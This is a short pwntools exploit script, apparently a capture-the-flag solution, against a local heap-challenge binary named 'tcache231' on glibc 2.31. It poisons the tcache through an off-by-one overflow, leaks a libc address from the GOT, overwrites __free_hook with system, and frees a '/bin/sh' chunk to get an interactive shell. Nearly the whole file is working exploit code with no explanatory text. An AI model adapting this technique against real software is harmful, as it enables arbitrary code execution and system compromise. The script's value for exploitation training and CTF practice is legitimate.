from pwn import *

p = process('./tcache231')
context.log_level = 'debug'
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

def launch_gdb():
    # context.terminal = ['xfce4-terminal', '-x', 'sh', '-c'] 
    # gdb.attach(proc.pidof(p)[0]) 
    os.system("gnome-terminal -- gdb -q ./tcache231 " + str(proc.pidof(p)[0]))

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    
def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    
def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

# launch_gdb()
new(0x28,'zzz') # 0
new(0x100,'aaa') # 1
new(0x100,'aaa') # 1
delete(2)
delete(1)
delete(0)
new(0x28,'a'*0x28)
delete(1)
new(0xf0,p64(0x4040AC))
new(0x100,'aaa')
new(0x100,p32(0) + p64(0) * 2 + p64(0xffffff) * 4 + p64(0x404018)+p64(0)*5)
show(0)
leak = u64(p.recv(6) + b'\x00'*2) - 645200
log.info('leak ' + hex(leak))
new(0x28,'zzz') # 0
new(0x100,'aaa') # 1
new(0x100,'aaa') # 1
delete(3)
delete(2)
delete(1)
new(0x28,'/bin/sh\x00' + 'a'*0x20)
delete(2)
new(0xf0,p64(leak + libc.symbols['__free_hook']))
new(0x100,p64(leak + libc.symbols['__free_hook']))
new(0x100,p64(leak + libc.symbols['system']))
delete(1)
p.interactive()